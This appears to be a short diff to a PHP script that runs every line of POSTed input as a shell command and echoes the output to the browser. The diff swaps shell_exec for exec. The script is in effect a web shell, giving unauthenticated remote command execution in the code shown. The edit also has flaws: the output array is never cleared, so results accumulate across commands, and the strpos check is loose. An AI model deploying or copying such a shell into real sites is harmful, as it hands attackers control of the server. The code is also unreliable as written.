@@ -8,7 +8,8 @@
 		$cmds = explode("\n", $_POST['input']);
 		foreach($cmds as $cmd) {
 			if ($_POST['stderr'] && strpos($cmd, '2>&1') == FALSE) $cmd .= ' 2>&1';
-			$a .= shell_exec($cmd);
+			exec($cmd, $ou);
+			$a .= implode("\n", $ou);
 		}
 		$a = str_replace("\n", "<br>\n", htmlentities($a));
 		echo $a;
